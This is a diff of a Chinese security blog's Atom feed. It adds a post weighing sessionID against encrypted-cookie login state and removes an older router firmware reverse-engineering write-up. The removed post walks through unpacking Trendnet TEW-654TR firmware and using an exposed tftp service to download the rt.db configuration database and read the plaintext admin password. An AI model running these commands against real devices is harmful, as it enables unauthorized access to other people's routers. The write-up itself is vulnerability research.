@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://xdxd.love/"/>
-  <updated>2015-12-30T03:03:50.000Z</updated>
+  <updated>2016-01-11T08:47:57.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -13,6 +13,34 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[无状态协议中认证状态保持方案的一些思考]]></title>
+    <link href="http://xdxd.love/2016/01/07/%E6%97%A0%E7%8A%B6%E6%80%81%E5%8D%8F%E8%AE%AE%E4%B8%AD%E8%AE%A4%E8%AF%81%E7%8A%B6%E6%80%81%E4%BF%9D%E6%8C%81%E6%96%B9%E6%A1%88%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
+    <id>http://xdxd.love/2016/01/07/无状态协议中认证状态保持方案的一些思考/</id>
+    <published>2016-01-07T03:12:42.000Z</published>
+    <updated>2016-01-11T08:47:57.000Z</updated>
+    <content type="html"><![CDATA[<p>给文章起了一个高大上的名字，主要是想写一下对于http协议中用户登陆之后，如何进行用户身份跟踪，以及不同的实现方案可能存在的安全问题。</p>
+<h1 id="何为登陆">何为登陆</h1><p><a href="https://en.wikipedia.org/wiki/Login" target="_blank" rel="external">login维基百科</a>上解释是一个用户通过认证获得一个系统的访问权限的过程。感觉更多的是一种业务上的描述，在讨论安全架构设计的时候都是使用identity,authentication等词语描述。</p>
+<h1 id="何为认证_authentication">何为认证 authentication</h1><h1 id="不同的认证方式">不同的认证方式</h1><p>认证有不少协议，参考<a href="https://en.wikipedia.org/wiki/Basic_access_authentication" target="_blank" rel="external">Basic access authentication</a></p>
+<h1 id="最常见的情形">最常见的情形</h1><p>在web应用中，通常都是web表单提交用户名密码的方式实现登陆。登陆之后，服务端会写一些信息到cookie中，以后的访问通过cookie中的信息来识别该请求的来源用户身份。</p>
+<p>在比较早的应用中还可以看到服务端将用户名和密码保存在cookie中，服务端对每个请求，都会验证验证cookie中的用户名和密码是否正确。这种实现方案虽然在功能上实现了保持用户的身份状态。但是有比较高的安全风险。现在基本上很少见这种实现了。</p>
+<p>目前最常见的两种方式，一种是使用sessionID的方式来跟踪用户，一种是将加密后的用户id或者用户id和密码保存在cookie中。以前我一直以为使用sessionID的方式才是最佳实践，把用户信息加密之后放在客户端是一种违背了安全设计思路的事情。但是看到<a href="http://drops.wooyun.org/papers/1449" target="_blank" rel="external">Codeigniter</a>作为流行的框架，也是采用了这种设计。</p>
+<p>其实仔细思考一下，可以认为这是两种不同的设计方式，各有优劣，只要设计得当，都可以做到安全。采用sessionid的方式一定要有一个集中的管理session数据的中心，而采用加密算法的方式可以认为是将数据查询的过程转化成了cpu操作的加解密。这样子就不需要依赖集中的数据中心可以方便的实现分布式。</p>
+<p>使用sessionid的方式，需要一个中心管理session数据<br><img src="/images/denglu1.png" alt=""></p>
+<p>使用加解密用户数据的方式维持登录状态不需要数据查询，只需要cpu加解密操作就可以。</p>
+<p><img src="/images/denglu2.png" alt=""></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>给文章起了一个高大上的名字，主要是想写一下对于http协议中用户登陆之后，如何进行用户身份跟踪，以及不同的实现方案可能存在的安全问题。</p>
+<h1 id="何为登陆">何为登陆</h1><p><a href="https://en.wikipedia.org/wiki/]]>
+    </summary>
+    
+      <category term="sso" scheme="http://xdxd.love/tags/sso/"/>
+    
+      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[利用xposed绕过安卓SSL证书的强校验]]></title>
@@ -1087,175 +1115,6 @@ C++ compiler c++ <span ]]>
     </summary>
     
       <category term="qemu" scheme="http://xdxd.love/tags/qemu/"/>
-    
-      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[逆向路由器固件之二]]></title>
-    <link href="http://xdxd.love/2015/08/24/%E9%80%86%E5%90%91%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E4%B9%8B%E4%BA%8C/"/>
-    <id>http://xdxd.love/2015/08/24/逆向路由器固件之二/</id>
-    <published>2015-08-24T12:11:13.000Z</published>
-    <updated>2015-11-24T03:27:38.000Z</updated>
-    <content type="html"><![CDATA[<p><a href="http://localhost:4000/2015/08/24/%E9%80%86%E5%90%91%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E4%B9%8B%E8%A7%A3%E5%8C%85/" target="_blank" rel="external">之前的文章中</a>详细介绍了各种解包路由器固件的工具。解包之后就获得了固件中的文件。下一步就是分析文件寻找漏洞了。这次分析的目标是Trendnet路由器，分析的漏洞是一个远程获取路由器权限的漏洞。<br><img src="/images/trendnet1.png" alt=""></p>
-<p>通过路由器的登录界面得知路由器型号为Trendnet TEW-654TR,这对收集目标的信息是很有帮助的。通过<a href="http://www.trendnet.com/products/proddetail.asp?prod=175_TEW-654TR&amp;cat=41" target="_blank" rel="external">官方介绍</a>得知该路由器的一些特性。包括支持路由器，无线接入点，无线接入点客户端三种模式，支持NAT和有状态的包检查防御攻击以及有一个简单的web界面支持远程管理等。官网目前最新版固件为V1.10B26。本文中分析的固件版本为V1.10B12,可以从<a href="http://download.trendnet.com/TEW-654TR/firmware/" target="_blank" rel="external">这里下载</a>。</p>
-<p>为了方便就不适用file等工具进行信息收集了。直接使用binwalk查看bin文件信息，可以看到是比较标准的基于linux的文件系统。</p>
-<p><img src="/images/trendnet2.png" alt=""></p>
-<p>使用Firmware Mod Kit直接自动解包成功：</p>
-<p><img src="/images/trendnet3.png" alt=""></p>
-<p>解包成功之后第一件事情就是看一下etc目录配置文件和启动脚本。</p>
-<pre><code>  etc git:(master) ✗ ls -al
-total <span class="number">32</span>
-drwxrwxrwx   <span class="number">7</span> root  wheel   <span class="number">238</span>  <span class="number">5</span> <span class="number">30</span>  <span class="number">2011</span> .
-drwxrwxrwx  <span class="number">17</span> root  wheel   <span class="number">578</span>  <span class="number">5</span> <span class="number">30</span>  <span class="number">2011</span> ..
--rwxrwxrwx   <span class="number">1</span> root  wheel   <span class="number">230</span> <span class="number">11</span> <span class="number">10</span>  <span class="number">2008</span> fstab
--rwxr-xr-x   <span class="number">1</span> root  wheel  <span class="number">3774</span>  <span class="number">5</span> <span class="number">30</span>  <span class="number">2011</span> icon.ico
--rwxrwxrwx   <span class="number">1</span> root  wheel   <span class="number">109</span> <span class="number">11</span> <span class="number">10</span>  <span class="number">2008</span> inittab
-drwxrwxrwx   <span class="number">3</span> root  wheel   <span class="number">102</span>  <span class="number">3</span> <span class="number">23</span>  <span class="number">2010</span> rc.d
-lrwxrwxrwx   <span class="number">1</span> root  wheel    <span class="number">22</span>  <span class="number">8</span> <span class="number">24</span> <span class="number">19</span>:<span class="number">37</span> resolv.conf -&gt; ../var/etc/resolv.conf
-</code></pre><p>并没有发现有价值的配置文件，但是rc.d目录下有一个叫rcS的启动脚本。</p>
-<pre><code>➜  etc git:(master) ✗ cd rc.d
-➜  rc.d git:(master) ✗ ls -al
-total <span class="number">8</span>
-drwxrwxrwx  <span class="number">3</span> root  wheel  <span class="number">102</span>  <span class="number">3</span> <span class="number">23</span>  <span class="number">2010</span> .
-drwxrwxrwx  <span class="number">7</span> root  wheel  <span class="number">238</span>  <span class="number">5</span> <span class="number">30</span>  <span class="number">2011</span> ..
--rwxrwxrwx  <span class="number">1</span> root  wheel  <span class="number">768</span>  <span class="number">3</span> <span class="number">23</span>  <span class="number">2010</span> rcS
-</code></pre><p>rcS通常是在启动的时候初始化服务和环境，所以值得仔细看一下。</p>
-<pre><code>➜  rc.d <span class="symbol">git:</span>(master) ✗ cat rcS
-<span class="comment">#!/bin/ash</span>
-<span class="comment"># This script runs when init it run during the boot process.</span>
-<span class="comment"># Mounts everything in the fstab</span>
-mount -a
-mount -o remount +w /
-<span class="comment"># Mount the RAM filesystem to /tmp</span>
-mount -t tmpfs tmpfs /tmp
-<span class="comment"># copy all files in the mnt folder to the etc folder</span>
-cp -a /mnt/* <span class="regexp">/etc
-mkdir -p /var</span><span class="regexp">/etc
-mkdir -p /var</span><span class="regexp">/firm
-mkdir -p /var</span><span class="regexp">/log
-mkdir -p /var</span><span class="regexp">/misc
-mkdir -p /var</span><span class="regexp">/run
-mkdir -p /var</span><span class="regexp">/sbin
-mkdir -p /var</span><span class="regexp">/tmp
-mkdir -p /tmp</span><span class="regexp">/var
-cp -f /etc</span><span class="regexp">/udhcpd.conf /var</span><span class="regexp">/etc/</span>
-cp -f /etc/udhcpd.leases /var/misc/
-<span class="comment">#Add link for resolv.conf</span>
-<span class="comment">#ln -sf /var/etc/resolv.conf /etc/resolv.conf</span>
-<span class="comment"># Load configure file from Flash</span>
-/bin/echo <span class="string">"Init System..."</span>
-system_manager &amp;
-<span class="comment"># Start tftpd</span>
-/bin/echo <span class="string">"Start Tftpd..."</span>
-tftpd &amp;
-<span class="comment">#insert cc_dev module for reset packet counter</span>
-insmod /<span class="class"><span class="keyword">lib</span>/<span class="title">modules</span>/<span class="title">cc_dev</span>.<span class="title">ko</span></span>
-</code></pre><p>脚本比较简单，先建立一些目录，然后启动了system_manager和tftp，最后加载了一个内核模块。system_namager不知道是啥，先看下tftp吧。</p>
-<pre><code>eve<span class="variable">@eve</span><span class="symbol">:/opt/firmware-mod-kit/trunk/fmk/rootfs</span><span class="variable">$ </span>find -name tftpd
-./sbin/tftpd
-eve<span class="variable">@eve</span><span class="symbol">:/opt/firmware-mod-kit/trunk/fmk/rootfs</span><span class="variable">$ </span>file ./sbin/tftpd 
-./sbin/<span class="symbol">tftpd:</span> <span class="constant">ELF </span><span class="number">32</span>-bit <span class="constant">LSB </span>executable, <span class="constant">MIPS,</span> <span class="constant">MIPS-II </span>version <span class="number">1</span> (<span class="constant">SYSV)</span>, dynamically linked (uses shared libs), stripped
-eve<span class="variable">@eve</span><span class="symbol">:/opt/firmware-mod-kit/trunk/fmk/rootfs</span><span class="variable">$ </span>strings ./sbin/tftpd 
-/lib/ld-uClibc.so.<span class="number">0</span>
-p ,<span class="constant">D</span>
-<span class="constant">_init</span>
-<span class="constant">_fini</span>
-<span class="constant">__uClibc_main.</span>......
-</code></pre><p>通过函数名和一些字符串，感觉像是一个可以直连的tftp server。尝试连接一下试试看。</p>
-<pre><code>eve@eve:~$ tftp <span class="number">1.1</span><span class="number">.1</span><span class="number">.102</span>
-tftp&gt; get /var/etc/udhcpd.conf
-Received <span class="number">615</span> bytes in <span class="number">0.0</span> seconds
-tftp&gt; quit
-eve@eve:~$ cat udhcpd.conf 
-<span class="preprocessor"># Sample udhcpd configuration file (/etc/udhcpd.conf)</span>
-
-<span class="preprocessor"># The location of the leases file</span>
-lease_file  /var/misc/udhcpd.leases
-
-<span class="preprocessor"># The location of the pid file</span>
-pidfile /var/run/udhcpd.pid
-
-<span class="preprocessor"># Everytime udhcpd writes a leases file, the below script will be called.</span>
-<span class="preprocessor"># Useful for writing the lease file to flash every few hours.</span>
-notify_file dumpleases  <span class="preprocessor"># &lt;--- useful for debugging</span>
-
-<span class="preprocessor"># The following settings are added by system_manager</span>
-
-interface br0
-opt router <span class="number">192.168</span><span class="number">.10</span><span class="number">.1</span>
-option subnet <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>
-option domain 
-start <span class="number">192.168</span><span class="number">.10</span><span class="number">.101</span>
-end <span class="number">192.168</span><span class="number">.10</span><span class="number">.199</span>
-option lease <span class="number">604800</span>
-static_lease    <span class="number">00</span>:<span class="number">14</span>:d1:b6:<span class="number">02</span>:<span class="number">86</span>   <span class="number">192.168</span><span class="number">.10</span><span class="number">.1</span>
-</code></pre><p>发现tftp服务是运行的而且可以直接连接。下一步就是找一下哪里存有敏感信息了。通过rcS文件中的注释中可以知道system_manager这个程序可以从flash中加载配置文件。如果system_manager把配置文件写入到了临时目录或者虚拟内存盘中，那么我们就可以直接下载配置文件了。查找一下system_manager中使用的文件路径：</p>
-<pre><code>eve<span class="variable">@eve</span><span class="symbol">:/opt/firmware-mod-kit/trunk/fmk/rootfs</span><span class="variable">$ </span>strings ./usr/bin/system_manager | grep <span class="string">'/'</span>
-/lib/ld-uClibc.so.<span class="number">0</span>
-/etc/default_rt.db
-/etc/rt.db
-/etc/default_ap.db
-/etc/ap.db
-/etc/default_apc.db
-/etc/apc.db
-ln -sf /var/etc/resolv.conf /etc/resolv.conf
-/etc/scripts/config-vlan.sh <span class="number">2</span> <span class="number">0</span>
-tar -zxf /etc/www.tgz......
-</code></pre><p>db后缀的几个文件引起了我的注意，每一个文件都有一个文件名添加了default的备份文件。几乎所有的路由器都有恢复默认配置的功能，所以他们一定会把默认的配置存在某个地方。如果这些db文件是路由器的配置文件就有点说的通了。</p>
-<p>但是哪个文件存储了敏感的密码之类的信息呢。当然可以三个都下载下来看一下。想到最开始查看产品信息的时候有说到，这款路由器支持3种模式：route，access point，access point client。这里的3个db看起来刚好对应三种模式的配置。既然我们测试的这个目标开启了远程web管理，应该是route模式，所以先下载rt.db看看。</p>
-<pre><code>eve@eve:~$ tftp <span class="number">1.1</span>.<span class="number">1.102</span>
-tftp&gt; binary
-tftp&gt; get /etc/rt<span class="class">.db</span>
-Received <span class="number">49152</span> bytes <span class="keyword">in</span> <span class="number">0.1</span> seconds
-tftp&gt; quit
-eve@eve:~$ file rt<span class="class">.db</span> 
-rt<span class="class">.db</span>: SQLite <span class="number">3</span><span class="class">.x</span> database
-</code></pre><p>sqlite数据库。看一下里面的数据。</p>
-<pre><code>eve<span class="constant">@eve</span>:~$ sqlite3 rt.db
-SQLite version <span class="number">3.6</span><span class="number">.22</span>
-Enter <span class="string">".help"</span> <span class="keyword">for</span> instructions
-Enter SQL statements terminated <span class="keyword">with</span> a <span class="string">";"</span>
-sqlite&gt; .tables
-advanced_network      restore_default       wan_static          
-daylight_saving       smtp_settings         website_filter      
-db_version            special_application   website_filter_mode 
-dhcp_server           static_routing        wireless_advanced   
-dmz                   syslog                wireless_basic      
-dynamic_dns           time                  wireless_filter     
-dynamic_routing       user                  wireless_filter_mode
-ip_filter             virtual_server        wireless_security   
-lan_settings          wan_dhcp              wireless_wps        
-log_setting           wan_l2tp              wizard_setting      
-message               wan_pppoe             wpa_settings        
-nat_filter            wan_pptp            
-remote_management     wan_settings        
-sqlite&gt; .schema user
-CREATE TABLE <span class="string">"user"</span> (<span class="string">"user_name"</span> VARCHAR <span class="keyword">DEFAULT</span> <span class="string">''</span>, <span class="string">"user_pwd"</span> VARCHAR <span class="keyword">DEFAULT</span> <span class="string">''</span>, <span class="string">"level"</span> CHAR <span class="keyword">DEFAULT</span> <span class="string">''</span>)<span class="comment">;</span>
-sqlite&gt; <span class="keyword">select</span> * from user<span class="comment">;</span>
-admin|asecretpassword|<span class="number">1</span>
-user|asecretpassword|<span class="number">0</span>
-sqlite&gt;
-</code></pre><p>可以直接查询到登陆密码。使用数据库中的密码成功登陆。<br><img src="/images/trendnet4.png" alt=""></p>
-<p>通过一些简单的分析，我们找到了一个远程利用的漏洞。欢迎来到嵌入式安全的世界~当然这个漏洞看起来有点挫。下一篇会继续一些一些更有意思的漏洞。</p>
-<p>在最新版的固件中，厂商直接禁用掉了tftp的功能来解决这个问题。</p>
-<pre><code><span class="comment"># Load configure file from Flash</span>
-/bin/echo <span class="string">"Init System..."</span>
-system_manager &amp;
-
-<span class="comment"># Start tftpd</span>
-<span class="comment">#/bin/echo "Start Tftpd..."</span>
-<span class="comment">#tftpd &amp;</span>
-
-<span class="comment">#insert cc_dev module for reset packet counter</span>
-insmod /<span class="class"><span class="keyword">lib</span>/<span class="title">modules</span>/<span class="title">cc_dev</span>.<span class="title">ko</span></span>
-</code></pre>]]></content>
-    <summary type="html">
-    <![CDATA[<p><a href="http://localhost:4000/2015/08/24/%E9%80%86%E5%90%91%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E4%B9%8B%E8%A7%A3%E5%8C%85/" ta]]>
-    </summary>
-    
-      <category term="固件" scheme="http://xdxd.love/tags/%E5%9B%BA%E4%BB%B6/"/>
     
       <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
     
